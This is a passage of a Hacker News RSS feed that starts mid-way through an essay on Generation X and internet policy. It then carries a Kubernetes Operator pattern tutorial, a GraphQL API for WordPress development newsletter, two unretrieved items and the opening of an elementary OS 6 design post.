<p>That’s universal, and it hasn’t changed. Government and policy – the mechanics and grunt work, not the media showmanship – are powered by an army of hard-working, very young people who have all of the academic knowledge and very little of the practical experience. Those young folks, now, in 2021, who were in nappies when I was on the Hill, now run whatever corridors of power they (virtually) travel through, in professional support of those older politicians.</p>
<p>And it’s these young professionals – <em>not the boomer career politicians</em> – who are setting the tone of internet policy.</p>
<p>And here’s the thing.</p>
<p>We – the GenXers – think of the internet as the open web. The land of dialup telnet Unix systems, the days of table layout, the days of dot com, the days of early tech startups, the days of the internet as a connector, the days of the internet as a business opportunity, the days of the internet as a path to social justice and revolutions, the days of the internet as a light in the darkness. That’s all we have ever known.</p>
<p>Today’s policy facilitators – the millenials – think of the internet as MySpace and Facebook. The closed web. The land of always-on broadband and wifi, the days of content management systems, the days of tech bros, the days of the internet as a divider, the days of the internet as an acquisition for the giants, the days of the internet as a path to radicalisation and hatred, the days of the internet as petrol on a spark. That is all they have ever known.</p>
<p>And that is what they draft policy briefings, proposals, and legislation against.</p>
<p>Laws on freedom of speech. Laws on privacy. Laws on encryption. Laws on private surveillance. Laws on state surveillance.</p>
<p>The truths I held to be self-evident are things they have never known.</p>
<p>And, politically, they are in the driving seat. They are running the show.</p>
<p><em>Not me. Not the old folks. Them.</em></p>
<p>Just like I was, a long time ago, with my Scully hair, in my Unix dialup world, a world before the TV signal briefly went out because the antenna which controlled the TV signal was on top of the tower with the plane-shaped hole in it, the hole which turned one of my university classmates into a centimetre-long fragment of a finger recovered 18 months later.</p>
<p>Today’s young tech policy professionals are are, quite rightfully, responding to the only internet in the only world they have ever known. The awful one. The one where the internet <em>was and is</em> a handful of billion-pound companies. The one where the internet has only ever been petrol on a fire. The one where the internet has been essential infrastructure like water and heat, not a thing you had to request and master. The closed internet made for them. Not the open internet I got to make.</p>
<p>So if you think that the biggest threat to encryption is elderly politicians who still need their secretaries to print out emails for them, it’s time you found yourself in a meeting with someone under the age of 30 who is going to war against encryption because <em>he</em> has never needed encryption in his life.</p>
<p>If you think that the biggest threat to internet freedom is old white men who hate the internet because it does not allow them to attack anyone who does not look or sound like them, it’s time you found yourself in a meeting with someone under the age of 30 who is unabashedly in favour of mandatory identity verification for all users of the internet to protect people who look and sound like her.</p>
<p>And if you think that the biggest threat to freedom of speech on the open web is a tech billionaire in California, it’s time you found yourself in a meeting with someone under the age of 30 who sees a legislative victory against online freedom of speech, cloaked in the mantle of a victory against the tech billionaire, as a useful stepping stone to his political ambitions.</p>
<p>Those old Thatcherites still in politics, the elderly dames in the Lords, the newspaper editors with the offended senses of entitlement, they can whinge all they want about how the internet has changed the world they knew. And you can continue to waste your time on them, and their tropes, if it makes you feel better about yourself.</p>
<p>But political power, now, rests in the hands of young professionals who are – <em>rightfully – </em>legislating to change the only internet they have ever known.</p>
<p>The shitty corporate one.</p>
<p>The open web we let slip through our fingers.</p>
<p>And maybe, just maybe, the best things standing in their way of their spite and their avarice and their political aspirations are the Gen X fortysomethings who saw something better about the open web, and comprehended what was on their screens in a way that nothing has ever touched them since, and still believe in what the open web can be, and understand where things went wrong, and have an idea of how to put things right, and know how to create and use and fork the tools to make it so, and know the north stars they navigate home by, and have never, ever forgotten them, and who need a little bit of reminding, in chaotic times, of what it was like to telnet into a blank screen which contained the entire world.</p>
					</div></div>]]>
            </description>
            <link>https://webdevlaw.uk/2021/01/30/why-generation-x-will-save-the-web/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26368323</guid>
            <pubDate>Sat, 06 Mar 2021 16:08:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring the Kubernetes Operator Pattern]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26368315">thread link</a>) | @alexellisuk
<br/>
March 6, 2021 | https://iximiuz.com/en/posts/kubernetes-operator-pattern/ | <a href="https://web.archive.org/web/*/https://iximiuz.com/en/posts/kubernetes-operator-pattern/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a name="cut"></a>
I've been using Kubernetes for almost a year now and, to be honest, I like the experience so far. Most of my use cases were rather trivial and thanks to its declarative approach, Kubernetes makes deploying and scaling stateless services pretty simple. I usually just describe my application in a YAML file as a set of interconnected services, feed it to Kubernetes, and let the built-in <a href="https://kubernetes.io/docs/concepts/architecture/controller/">control loops</a> bring the state of the cluster closer to the desired state by creating or destroying some resources for me automagically.</p>
<p>However, many times I've heard that <a href="https://www.lastweekinaws.com/podcast/screaming-in-the-cloud/the-staying-power-of-kubernetes-with-kelsey-hightower/">the real power of Kubernetes comes with its extensibility</a>. Kubernetes designed for automation. It brings a lot of useful automation out of the box. But it also provides extension points that can be used to customize Kubernetes capabilities. The cleverness of the Kubernetes design is that it encourages you to keep the extensions feel native! So when I stumbled upon the first few Kubernetes Operators on my Ops way, I could not even recognize that I'm dealing with custom logic...</p>
<p>In this article, I'll try to take a closer look at the Operators pattern, see which Kubernetes parts are involved in operators implementation, and what makes operators feel like first-class Kubernetes citizens. Of course, with as many pictures as possible.
<a name="eofcut"></a></p>
<h2 id="a-namekubernetes-objects-and-controllersakubernetes-objects-and-controllers"><a name="kubernetes-objects-and-controllers"></a>Kubernetes Objects and Controllers</h2>
<p>Everything in Kubernetes seems to revolve around <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/kubernetes-objects/">objects</a> and <a href="https://kubernetes.io/docs/concepts/architecture/controller/">controllers</a>.</p>
<p>Kubernetes objects such as Pods, Namespaces, ConfigMaps, or Events are persistent entities in the Kubernetes system. Kubernetes uses these entities to represent the state of your cluster. Objects are also used as "records of intent." By creating (or removing) objects one can describe the <em>desired</em> state of the Kubernetes cluster.</p>
<p><i>Objects are like data structures.</i></p>
<p>On the other hand, controllers are infinite loops that watch the <em>actual</em> and the <em>desired</em> states of your cluster. When these two states diverge, controllers start making changes aiming to bring the current state of the cluster closer to the desired one.</p>
<p><i>Controllers are like algorithms.</i></p>
<p><img src="https://iximiuz.com/kubernetes-operator-pattern/kube-control-loop-3000-opt.png" width="100%" alt="Kubernetes Control Loop">
</p>

<p>I'll get to the controllers part later in this article and now let's focus on the objects.</p>
<h2 id="a-namekubernetes-api-architectureakubernetes-api-architecture"><a name="kubernetes-api-architecture"></a>Kubernetes API Architecture</h2>
<p>All interactions with Kubernetes objects, <a href="https://kubernetes.io/docs/reference/using-api/client-libraries/">directly</a> or <a href="https://kubernetes.io/docs/reference/kubectl/overview/">indirectly</a>, happen through <a href="https://kubernetes.io/docs/concepts/overview/kubernetes-api/">Kubernetes API</a> - a highly structured masterpiece of software design.</p>
<p>There is a ton of documentation written on Kubernetes API and related topics and I spent quite some time digesting it. Since we are going to talk about the Kubernetes Operator pattern which heavily depends on the capabilities of the Kubernetes API, it's important to familiarize ourselves with the API design principles first. Following is my super-condensed excerpt from the docs.</p>
<p>Kubernetes offers a RESTful declarative HTTP API. Still remember those Kubernetes objects? <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#custom-resources">A collection of objects of a certain kind form an <em>API resource</em></a>:</p>
<blockquote>
<p>A resource is an endpoint in the Kubernetes API that stores a collection of API objects of a certain kind; for example, the built-in pods resource contains a collection of Pod objects.</p>
</blockquote>
<p>You can always check the list of available API resources using <code>kubectl api-resources</code> command:</p>
<pre><code>$ kubectl api-resources
NAME          SHORTNAMES   APIVERSION   NAMESPACED   KIND
namespaces    ns           v1           false        Namespace
nodes         no           v1           false        Node
pods          po           v1           true         Pod
deployments   deploy       apps/v1      true         Deployment
jobs                       batch/v1     true         Job
...</code></pre>
<p>OK, great, we've got resources. But Kubernetes evolves quickly. What if a new attribute needs to be added to an existing resource definition? API versioning is always hard. <i>&lt;speculation mode&gt;</i>Apparently, Kubernetes API started with a common prefix <code>/api/&lt;version&gt;/&lt;resource&gt;</code> for all the API resources. However, a change in a single resource would require a whole API version bump. So, with the growth in the number of available resources, the need for some sort of grouping and subversioning emerged.<i>&lt;/speculation mode&gt;</i></p>
<p>API groups to the rescue! <a href="https://kubernetes.io/docs/concepts/overview/kubernetes-api/#api-groups-and-versioning">A bunch of related resources forms an API group</a>:</p>
<blockquote>
<p>To make it easier to evolve and to extend its API, Kubernetes implements API groups that can be enabled or disabled.</p>
</blockquote>
<p>You can also check the list of available API groups and their versions using <code>kubectl api-versions</code> command:</p>
<pre><code>$ kubectl api-versions
admissionregistration.k8s.io/v1
admissionregistration.k8s.io/v1beta1
apiextensions.k8s.io/v1
apiextensions.k8s.io/v1beta1
apiregistration.k8s.io/v1
apiregistration.k8s.io/v1beta1
apps/v1
...</code></pre>
<p>Well, at this point, I should warn you - it seems that in the documentation, the term <em>resource</em> is often used in the meaning of an <em>object</em> (but not vice versa). So, context matters.</p>
<p>In Kubernetes, objects of the same kind are distinguished by their names. So, if you start two Pods, both should get a unique name. But clusters can be pretty big and since names are supposed to be unique within a cluster, we need a mechanism to prevent collisions. Something like lots of logical clusters within one physical cluster. Allow me to introduce you to <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/#when-to-use-multiple-namespaces"><em>namespaces</em></a>!</p>
<blockquote>
<p>Kubernetes supports multiple virtual clusters backed by the same physical cluster. These virtual clusters are called namespaces.</p>
</blockquote>
<blockquote>
<p>...</p>
</blockquote>
<blockquote>
<p>Namespaces provide a scope for names. Names of resources need to be unique within a namespace, but not across namespaces. Namespaces cannot be nested inside one another and each Kubernetes resource can only be in one namespace.</p>
</blockquote>
<p>Thus, API objects are fully qualified by their API group, resource type, namespace (unless cluster-scoped), and name.</p>
<p>Have you become totally confused by this time? No, worries, I've got a <del>simple</del> diagram for you 🙈</p>
<div>
    <p><img src="https://iximiuz.com/kubernetes-operator-pattern/kube-api-structure-3000-opt.png" width="100%" alt="Kubernetes API structure"></p><p><i>Kubernetes API structure.</i></p>
</div>

<p>So, a quick summary - we've learned about objects, resources, groups, and namespaces. But what's up with the promised customization?</p>
<h2 id="a-namekubernetes-custom-resourcesakubernetes-custom-resources"><a name="kubernetes-custom-resources"></a>Kubernetes Custom Resources</h2>
<p>It seems like there is <a href="https://github.com/kubernetes/community/blob/master/sig-api-machinery/README.md">a great deal of effort</a> in keeping the Kubernetes API coherent but extensible.</p>
<p>What do I mean by <em>coherent</em> here? Kubernetes API consists of endpoints called <em>resources</em>. These API resources adhere to a set of common requirements - they are nouns and manipulated in a declarative manner (RESTful CRUD), they should be updated relatively infrequently and be reasonably small in size, their names should be <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/names/#dns-subdomain-names">valid DNS subdomains</a>, etc.</p>
<p>These restrictions allow unifying the resource workflows. For instance, you can get, describe, or update a collection of Pods in pretty much the same way as a collection of Services, Nodes, or RBAC roles:</p>
<pre><code>$ kubectl get pods
$ kubectl get services
$ kubectl get roles

$ kubectl describe pods  # or services, or roles

$ kubectl edit pods  # or services, or roles</code></pre>
<p>Not only <code>kubectl</code> benefits from this uniformity. Here is a full list of <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#common-features">common features</a> enabled by the unified design:</p>
<div>
    <p><img src="https://iximiuz.com/kubernetes-operator-pattern/kube-api-common-features-3000-opt.png" width="100%" alt="Kubernetes API common features"></p>
</div>

<p>It's pretty handy, isn't it?</p>
<p>So, if I were to extend the API, it'd be reasonable for me to expect that my endpoints would benefit from this common functionality as well. But that would mean that the API extension should be done by adding more resources!</p>
<p>And indeed, in Kubernetes, one can easily register <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#custom-resources"><em>custom resources</em></a>. The procedure is fully dynamic and doesn't require restarting or updating the API server.</p>
<p>How such a custom resource can be added? Well, again, it's Kubernetes! Of course, by interacting with another, already existing resource! There is a special API resource called <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/#customresourcedefinitions">CustomResourceDefinition (CRD)</a>:</p>
<blockquote>
<p>The CustomResourceDefinition API resource allows you to define custom resources. Defining a CRD object creates a new custom resource with a name and schema that you specify.</p>
</blockquote>
<p>And <a href="https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#create-a-customresourcedefinition">from another documentation page</a>:</p>
<blockquote>
<p>When you create a new CustomResourceDefinition (CRD), the Kubernetes API Server creates a new RESTful resource path for each version you specify.</p>
</blockquote>
<h2 id="a-namehow-to-create-custom-resourceahow-to-create-custom-resource"><a name="how-to-create-custom-resource"></a>How to Create Custom Resource</h2>
<p>Let's try to create a custom resource. Remember, a resource specifies a certain kind of Kubernetes object. Canonically, objects possess some attributes. So, our CustomResourceDefinition should be mostly concerned with describing the attributes of our future resource. Additionally, it's good to know that custom resources can be either namespaced or cluster-scoped. This is specified in the CRD's scope field.</p>
<pre><code>apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: blogposts.iximiuz.com
spec:
  group: iximiuz.com
  names:
    kind: BlogPost
    listKind: BlogPostList
    plural: blogposts
    singular: blogpost
  scope: Namespaced
  versions:
  - name: v1alpha1
    schema: ...
...</code></pre>
<details><summary>Click here to see the full CRD's YAML.</summary>
<pre><code>kubectl apply -f - &lt;&lt;EOF
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: blogposts.iximiuz.com
spec:
  group: iximiuz.com
  names:
    kind: BlogPost
    listKind: BlogPostList
    plural: blogposts
    singular: blogpost
  scope: Namespaced
  versions:
  - name: v1alpha1
    schema:
      openAPIV3Schema:
        description: BlogPost is a custom resource exemplar
        type: object
        properties:
          apiVersion:
            description: 'APIVersion defines the versioned schema of this representation
              of an object. Servers should convert recognized schemas to the latest
              internal value, and may reject unrecognized values. More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#resources'
            type: string
          kind:
            description: 'Kind is a string value representing the REST resource this
              object represents. Servers may infer this from the endpoint the client
              submits requests to. Cannot be updated. In CamelCase. More info: https://git.k8s.io/community/contributors/devel/sig-architecture/api-conventions.md#types-kinds'
            type: string
          metadata:
            type: object
          spec:
            description: BlogPostSpec is the spec for a BlogPost resource
            type: object
     …</code></pre></details></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://iximiuz.com/en/posts/kubernetes-operator-pattern/">https://iximiuz.com/en/posts/kubernetes-operator-pattern/</a></em></p>]]>
            </description>
            <link>https://iximiuz.com/en/posts/kubernetes-operator-pattern/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26368315</guid>
            <pubDate>Sat, 06 Mar 2021 16:07:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building the GraphQL API in the Open #1]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26368159">thread link</a>) | @leoloso
<br/>
March 6, 2021 | https://graphql-api.com/blog/building-in-the-open-episode-1/ | <a href="https://web.archive.org/web/*/https://graphql-api.com/blog/building-in-the-open-episode-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Welcome to the very first "Building in the Open" newsletter!</p><p>This is a channel to share news concerning the development of the GraphQL API for WordPress with the community, sent the first week of each month.</p><p>Through this space, we will learn everything that happened during the last month, including:</p><p>✅ What we've been working on, what new features we released<br>✅ What we will be working on the upcoming month<br>✅ Amount of traffic we got on the site<br>✅ How did the plugin do: Number of downloads, newsletter subscriptions, GitHub stars<br>✅ Progress on achieving financial sustainability<br>✅ Newly published guides<br>✅ Summary of our recently published blog posts<br>✅ Reaching out / Plugin mentions<br>✅ General news</p><p>If you enjoy this newsletter, please invite your friends to <a href="https://graphql-api.com/newsletter/">subscribe</a>.</p><p>Let's start!</p><p><strong>Heads up:</strong> This newsletter is a two-way communication channel. If there's anything you'd like to say, be welcome to <a href="#comments">add a comment</a> (at the bottom of the blog post).</p><p><img src="https://graphql-api.com/images/building-in-the-open-episode-1/welcome.png" alt="A welcome to the newsletter, by your host" loading="lazy" width="928" height="550"></p><h2 id="heading-what-we've-been-coding-on">What we've been coding on<a href="#heading-what-we've-been-coding-on"><span> permalink</span></a></h2><p>If you notice the <a href="https://graphql-api.com/guides/">Guides</a>, section "Extending the GraphQL API" is still pretty empty:</p><figure><img src="https://graphql-api.com/images/building-in-the-open-episode-1/guides-extending-section.jpg" alt="Guides for &quot;Extending the plugin&quot; are not yet complete" loading="lazy" width="928" height="965"><figcaption>Guides for 'Extending the plugin' are not yet complete</figcaption></figure><p>My priority is to complete these guides. But before I do that, I want the plugin's code to be as simple as possible. The simpler it is, the less documentation is required, and the more anyone and everyone is able to understand it.</p><p>With this in mind, I've decided to refactor the code, to have it be fully based on <a href="https://symfony.com/doc/current/components/dependency_injection.html">Symfony's DependencyInjection Component</a>.</p><p>The idea is that any extension to the plugin (such as a custom <code>TypeResolver</code>, <code>FieldResolver</code> or <code>DirectiveResolver</code>) is simply defined as a service in the container, and the service is automatically configured via <a href="https://symfony.com/doc/current/service_container/compiler_passes.html">Compiler passes</a>.</p><p>Fully relying on Symfony's dependency injection has several advantages:</p><p>✅ There is a single, consistent way to create extensions<br>✅ Just creating a PHP class implementing some interface does the whole job, and the developer needs not be aware of the nitty-gritty details<br>✅ Symfony's documentation is very extensive. By pointing developers to it, that is documentation that <strong>I do not need to write</strong></p><p>Interested in the code? Check out my latest merged PRs (<a href="https://github.com/leoloso/PoP/pull/453">#453</a>, <a href="https://github.com/leoloso/PoP/pull/452">#452</a>, <a href="https://github.com/leoloso/PoP/pull/449">#449</a> and several others).</p><p>I will keep working on this code for the upcoming weeks, until the migration is 100% complete, and I get to write the missing guides.</p><h2 id="heading-traffic-to-graphql-api.com">Traffic to graphql-api.com<a href="#heading-traffic-to-graphql-api.com"><span> permalink</span></a></h2><p>Let me be clear on something: I care about how many people visit the plugin's website, as a proxy to know how many people know about the plugin.</p><p>I don't have deep pockets to publicize my plugin. And even if I did, I wouldn't spend my money on promoting it, since that goes against the spirit of open source. (This would be different if open source were just a channel to sell some product or service, but that's not my case.)</p><p>That means that I rely fully on word of mouth to promote it. For that, I've been devoting plenty of effort in writing high-quality content for <a href="https://graphql-api.com/blog/">the plugin's blog</a>, hoping this content would get shared around, reaching people who would otherwise not know about the plugin.</p><p>And so far, I'm pretty happy with the results.</p><p>During the past month, I've had 4.5k visitors, with 6k page views:</p><figure><img src="https://graphql-api.com/images/building-in-the-open-episode-1/traffic.jpg" alt="Show me the money!" loading="lazy" width="1024" height="940"><figcaption>Show me the money!</figcaption></figure><p>Let's break down these stats.</p><p>Most of my visitors come from Hacker News, where I managed to pull a few "Show HN" front pages, and Reddit, mostly from <a href="https://www.reddit.com/r/PHP/">/r/PHP</a> and <a href="https://www.reddit.com/r/graphql/">/r/graphql</a> (where I always share my articles).</p><p>I managed to <a href="https://twitter.com/losoviz/status/1365873932675391488">rank #1 on Google when searching "wordpress core graphql"</a>, and that brought plenty of traffic. Unfortunately, it was a one time-off: after 24hs it went away as suddenly as it arrived. Otherwise, on a typical day I get between 3 and 10 visitors from Google.</p><p>Twitter and Facebook bring a sizable amount of traffic, but I don't know from who (not from me, since I am extremely bad at social media). I do share my articles on Twitter, but they seldom get retweeted. And I do not use 👎🏾 Facebook.</p><p>(Btw, for those of you who share my articles on social media, thanks ❤️)</p><p>I get some modest but consistent traffic from the <a href="https://graphql.org/code/#php">listing of GraphQL servers in PHP on graphql.org</a>, and from <a href="https://dev.to/leoloso/executing-multiple-queries-in-a-single-operation-in-graphql-goe">an article I've published on dev.to</a>, which ranks #1 when <a href="https://www.google.com/search?q=graphql+execute+multiple+queries">googling "graphql execute multiple queries"</a>.</p><p>Finally, my articles consistently appear in WordPress' main newsletters (including <a href="https://wpowls.co/">WP Owls</a>, <a href="https://wpmail.me/">wpMail.me</a>, <a href="https://poststatus.com/newsletter/">Post Status</a>, <a href="https://wpbuilds.com/">WP Builds</a>, and <a href="https://thewpweekly.com/">The WP Weekly</a>). I don't know exactly how much traffic each of them brings, since the referrer will appear as Gmail and similar others. However, when taken together, these newsletters produce a sizable number of visitors.</p><p>My blog posts are by far my most popular content, with the last three (<a href="https://graphql-api.com/blog/why-wordpress-should-have-a-graphql-api-in-core/">this one</a>, <a href="https://graphql-api.com/blog/graphql-api-vs-wpgraphql-the-fight/">this one</a> and <a href="https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/">this one</a>) bringing over 1k visitors each.</p><p>These numbers look pretty good, more since I barely launched the website less than 2 months ago. However, not everything looks good: At 88%, the bounce rate is quite high. I need to work on that.</p><h2 id="heading-metrics">Metrics<a href="#heading-metrics"><span> permalink</span></a></h2><p>Traffic to the site is only a decorative metric, to estimate awareness of the plugin. But far more important to ask is: How many people started using the plugin during the past month?</p><figure><img src="https://graphql-api.com/images/building-in-the-open-episode-1/multiply.png" alt="My reputation precedes me" loading="lazy" width="928" height="550"><figcaption>My reputation precedes me</figcaption></figure><p>During the past month, the plugin fared like this:</p><p>🎯 Number of plugin downloads: 170<br>⭐️ GitHub stars: 27</p><p>The number of downloads can be retrieved from the GitHub API, passing param <code>per_page=3</code> to include only the 3 releases created during the last month:</p><pre><code><span><span>curl</span> -H <span>"Accept: application/vnd.github.v3+json"</span> https://api.github.com/repos/leoloso/PoP/releases?per_page<span>=</span><span>3</span> <span>|</span> <span>grep</span> <span>"download_count"</span></span></code></pre><p>I am neither happy nor unhappy about these numbers. They are not great (and I wish they were better), but they are a good start.</p><p>Concerning <strong>downloads</strong>, it is said that getting the first user is the most difficult task. Only after a few people start using the plugin, and start talking about it, that its use will become more widespread. I am still within this initial stage of finding the first batch of commited users.</p><p>Concerning <strong>GitHub stars</strong>, I must say it looks pretty flat: around 1 star per day on average. This is certainly nothing great. If you like what I'm building with the GraphQL API for WordPress, and you don't mind showing some ❤️ love, then please consider <a href="https://github.com/leoloso/PoP">giving it a ⭐️ star on GitHub</a>.</p><h2 id="heading-financial-sustainability">Financial Sustainability<a href="#heading-financial-sustainability"><span> permalink</span></a></h2><p>This one is the tough issue: the project must be financially sustainable. It either generates a bit of money, or it won't make it for long.</p><figure><img src="https://graphql-api.com/images/building-in-the-open-episode-1/cheese.png" alt="In this goes my life" loading="lazy" width="928" height="800"><figcaption>In this goes my life</figcaption></figure><p>If I am able to make an income for myself, then I can keep working on it, for as long as needed. That's all I need: an income. Not investors knocking on my door looking for millions. Just a couple thousands per month, to pay for the roof above my head.</p><p>My goal is to keep the plugin fully open source. For that, I'm currently reaching out to a couple of potential sponsors, asking if they'd like to help fund the development of the plugin. It will be a win-win situation.</p><p>Why am I resorting to some "big guns" sponsors, instead of relying on regular sponsorship, by anyone from the community?</p><p>Yes, I've been trying that too: I am on <a href="https://github.com/sponsors/leoloso">GitHub Sponsors</a>. However, it doesn't really work, unless you already have thousands of users, followers, or people subscribed to your mailing list, to whom you can reach out to, expecting many of them to fund you.</p><p>For instance, asking for a standard u$d 5 or 10 per month, I'd need several hundred funders for this approach to fund my work. And I'm nowhere near that stage.</p><p>But even more, who can really succeed with this approach? I know that Caleb Porzio (creator of Livewire) <a href="https://calebporzio.com/i-just-hit-dollar-100000yr-on-github-sponsors-heres-how-i-did-it">has made it</a>, and has now <a href="https://github.com/sponsors/calebporzio#sponsors">reached over 1350 sponsors</a>! But that's more the exception than the norm.</p><p>Take Composer, for instance. Composer has fundamentally changed how we develop PHP applications, yet <a href="https://github.com/sponsors/composer">they barely have 90 sponsors</a>. How could I ever expect to get more sponsors than Composer?</p><p>That's why my current approach is to create a win-win situation for my project and the few companies willing to sponsor it. Let's hope it will work out, and the GraphQL API is free for everyone, for all the features, and I don't need to lock the good stuff behind a paywall.</p><p>(If you'd like to find out how it's a win-win, please <a href="https://graphql-api.com/contact">send me an email</a> or <a href="https://twitter.com/losoviz">DM</a>. Maybe your company may be interested too?)</p><p>I'll give this approach a few months, hopefully I will make it happen. If I don't succeed, only then I will need to consider building a PRO version of the plugin, and restricting some of the features for the paid version. (Yeah, that would suck, so I hope I can avoid that stage.)</p><p>In the upcoming newsletters, I will keep you updated if I managed to get sponsors or not.</p><h2 id="heading-blog-posts">Blog posts<a href="#heading-blog-posts"><span> permalink</span></a></h2><p>The blog posts have been my absolute pride and joy.</p><p><strong>Heads up:</strong> Did you know there's an <a href="https://graphql-api.com/feed.xml">RSS feed on the site</a>? You can subscribe to receiving all my blog posts, read them on your favorite reader.</p><p>During the past month, I've managed to publish a high-quality blog post every week:</p><p><a href="https://graphql-api.com/blog/why-wordpress-should-have-a-graphql-api-in-core/">🛠 Should WordPress have a GraphQL API in core?</a> makes the case that WordPress could benefit from GraphQL, since the WP REST API was given a new functionality in WordPress 5.6 (batch operations), that a GraphQL API can deliver natively.</p><p><a href="https://graphql-api.com/blog/graphql-api-vs-wpgraphql-the-fight/">🥊 GraphQL API vs WPGraphQL: the fight!</a> compares my plugin with <a href="https://www.wpgraphql.com/">WPGraphQL</a>, on a clash to be remembered for ages to come, and which will keep boxing fans asking for more.</p><p><a href="https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/">👶🏻 Rejuvenating WordPress through GraphQL</a> demonstrates how a headless WordPress can be decoupled from the WordPress codebase, providing an opportunity to fix (or, at least, bypass) the accumulated technical debt.</p><p><a href="https://graphql-api.com/blog/graphql-api-for-wp-is-now-scoped-thanks-to-php-scoper/">🍾 GraphQL API for WordPress is now scoped, thanks to PHP-Scoper!</a> describes a strategy to scope a WordPress plugin using <a href="https://github.com/humbug/php-scoper">PHP-Scoper</a>, as to avoid conflicts with other plugins.</p><h2 id="heading-reaching-out-plugin-mentions">Reaching out / Plugin mentions<a href="#heading-reaching-out-plugin-mentions"><span> permalink</span></a></h2><p>I'm delighted that the plugin has been featured in a few places.</p><p>✅ I have given talk "Intro to the GraphQL API for WordPress" in WordCamp India 2021, doing a demo of the plugin, and (surprisingly from doing a demo) it all came out perfectly! Check out <a href="https://www.youtube.com/watch?v=LnyNyT2RwwI">the Youtube video</a>.</p><p>✅ Joe Howard has interviewed me for the <a href="https://wpmrr.com/podcast/">WPMRR podcast</a>. The recording will come out soon.</p><p>✅ Chris Coyier …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://graphql-api.com/blog/building-in-the-open-episode-1/">https://graphql-api.com/blog/building-in-the-open-episode-1/</a></em></p>]]>
            </description>
            <link>https://graphql-api.com/blog/building-in-the-open-episode-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26368159</guid>
            <pubDate>Sat, 06 Mar 2021 15:46:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA['Canada's leading ecologist': David Schindler dead at 80]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26367154">thread link</a>) | @dredmorbius
<br/>
March 6, 2021 | https://www.cbc.ca/news/canada/edmonton/david-schindler-obituary-1.5938189 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/edmonton/david-schindler-obituary-1.5938189">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.cbc.ca/news/canada/edmonton/david-schindler-obituary-1.5938189</link>
            <guid isPermaLink="false">hacker-news-small-sites-26367154</guid>
            <pubDate>Sat, 06 Mar 2021 13:21:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lisp for the Web (2008)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26367148">thread link</a>) | @simonpure
<br/>
March 6, 2021 | https://www.adamtornhill.com/articles/lispweb.htm | <a href="https://web.archive.org/web/*/https://www.adamtornhill.com/articles/lispweb.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.adamtornhill.com/articles/lispweb.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-26367148</guid>
            <pubDate>Sat, 06 Mar 2021 13:19:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Look and Feel Changes Coming to Elementary OS 6]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26366795">thread link</a>) | @dmytton
<br/>
March 6, 2021 | https://blog.elementary.io/look-and-feel-changes-elementary-os-6/ | <a href="https://web.archive.org/web/*/https://blog.elementary.io/look-and-feel-changes-elementary-os-6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  <header>
    
    
      <h2>



   Visual design updates that are more than skin&nbsp;deep

</h2>
    

    






    


  </header>

  <section>
    <p>When a new major version of some piece of software is released, there is often an immediate focus put on visual changes. If there aren’t a ton of new and shinies, social media will inevitably be filled with words like “stale,” “old,” and “outdated.” This has become especially true for elementary OS, whose visual design hasn’t really changed all that much over the years. At elementary, we tend to avoid making changes for the sake of change. We’re very skeptical about design trends, and do our best to create things that feel a bit more “evergreen.” After all, “Good design is long lasting” and this allows us to focus more on refining than constantly reinventing. We also have a third-party developer community to think about, and making sweeping visual changes means that the nearly 200 apps in AppCenter will have to be updated and tested to make sure they still look as intended. So, when we decided to work on the look and feel for elementary OS 6, we wanted to approach things with a lot of intentionality, avoiding trends and focusing on setting the stage for the next several years.</p>



<p>App developers rely on pre-made widgets to do a lot of the heavy lifting and provide good default styles when making their apps. In addition to the widgets provided by GTK, we also ship our GTK companion library Granite that makes replicating common elementary design patterns a breeze. In elementary OS 6, we’re also making heavy use of Handy—a library that was originally developed by Purism for mobile interfaces but has now become a core part of the GNOME app development platform on the desktop. Thanks to Handy, we have two major, obvious visual design improvements that developers can adopt.</p>



